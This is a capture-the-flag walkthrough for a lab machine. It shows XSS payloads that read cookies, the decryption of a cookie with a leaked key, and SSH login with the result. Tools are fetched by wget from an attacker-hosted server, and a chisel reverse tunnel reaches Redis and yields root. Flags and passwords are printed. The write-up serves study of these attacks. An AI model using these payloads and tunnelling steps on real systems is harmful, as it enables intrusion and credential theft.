## Initial Reconnaissance

I began by scanning the network to find the target machine’s IP address:

```bash
ip neigh 

# Alternatively, we can use: 
sudo arp-scan -l
```

![ip](./assets/ip.png)

The discovered IP address was 192.168.56.103.

I ran an nmap scan which revealed two open ports: 22 (SSH) and 80 (HTTP).

![nmap](./assets/nmap.png)

---

## Enumeration 

My first step was to visit the web page hosted on port 80.

![webpage](./assets/webpage.png)

I then examined the source code and ran `gobuster` to enumerate hidden directories.

![gobuster](./assets/gobuster.png)

The following endpoints were discovered:

- `/index.html`: 200 OK
- `/js/`: Contained `main.js`
- `/css/`, `/img/`, `/manual/`: Static content
- `/.htaccess`, `.htpasswd`, `/server-status`: Forbidden

Navigating into `/js/`, I found a file named main.js with the following content:

![js](./assets/js.png)

```javascript
function viewDetails(str) {
   window.location.href = "opus-details.php?id="+str; 
}

/* var CryptoJS = require("crypto-js"); 
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum"); console.log(decrypted.toString(CryptoJS.enc.Utf8)); 
*/
```

This revealed:

- A client-side redirection function.
- A commented-out decryption snippet with a hardcoded AES passphrase: `SecretPassphraseMomentum`.

The redirection function was interesting because visiting image links redirected the URL with an `id` parameter, for example:

```http
http://192.168.56.103/opus-details.php?id=demon
```

![demon](./assets/demon.png)

Similarly, the `id` changed on visiting another image, like `angel`:

```http
http://192.168.56.103/opus-details.php?id=angel
```

![angel](./assets/angel.png)


Experimenting with the `id` parameter, I tested an XSS payload:

```http
http://192.168.56.103/opus-details.php?id=<script>alert(1)</script>
```

The payload was reflected, confirming the vulnerability.

![xss](./assets/xss.png)

I further used the payload to retrieve the cookie value:

```http
http://192.168.56.103/opus-details.php?id=<script>alert(document.cookie)</script>
```

![cookie](./assets/cookie.png)

The cookie value appeared encrypted:

```text
cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt
```

Knowing the AES key from the commented script, I created a Node.js decryption script:

```javascript
var CryptoJS = require("crypto-js"); 
var encrypted =
"U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt"; 
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum"); console.log(decrypted.toString(CryptoJS.enc.Utf8));`
```

The output was:

```text
auxerre-alienum##
```

![decryption](./assets/decryption.png)

This appeared to be credentials or a password.

---

## Exploitation  
After trial and error, I successfully logged in via SSH:

```bash
ssh auxerre@192.168.56.103   
# password: auxerre-alienum##
```

I obtained the user flag:

```text
84157165c30ad34d18945b647ec7f647
```

![user-flag](./assets/user-flag.png)

---

## Initial Shell & Post-Exploitation  

To escalate privileges, I launched `linpeas` for an automated system scan.

```bash
# Local machine:   
python3 -m http.server 8000 

# Target machine:   
cd /tmp   wget http://<vboxnet>:8000/linpeas.sh   
# Make it executable
chmod +x linpeas.sh
```

`linpeas` revealed a local service: Redis running on localhost only.

```text
127.0.0.1:6379 → redis-server listening on localhost only
```

![redis](./assets/redis.png)

This was confirmed by:

```bash
ps aux | grep redis   
ss -nltup | grep 6379
```

However, connecting locally to Redis produced a permission denied message.

![redis-cli](./assets/redis-cli.png)

---

## Privilege Escalation via Port Forwarding  

To connect remotely, I used `chisel` for port forwarding.

```bash
# Local machine:   
python3 -m http.server 8000 

# Target machine:   
cd /tmp   wget http://<vboxnet>:8000/chisel   
# Make it executable
chmod +x chisel
```

On the attacker machine, I ran:

```bash
chisel server --reverse --port 5555
```

![chisel-server](./assets/chisel-server.png)

On the target machine, I ran:

```bash
./chisel client <attacker-ip>:5555 R:127.0.0.1:6379
```

![chisel-client](./assets/chisel-client.png)

This allowed remote connection to the Redis server for further exploitation.

![rootpass](./assets/rootpass.png)

---

## Root Access  

With the root password obtained, I switched to root user:

```bash
su root   
# Password: m0mentum-al1enum##
```

Finally, I retrieved the root flag:

```text
658ff660fdac0b079ea78238e5996e40
```

![root-flag](./assets/root-flag.png)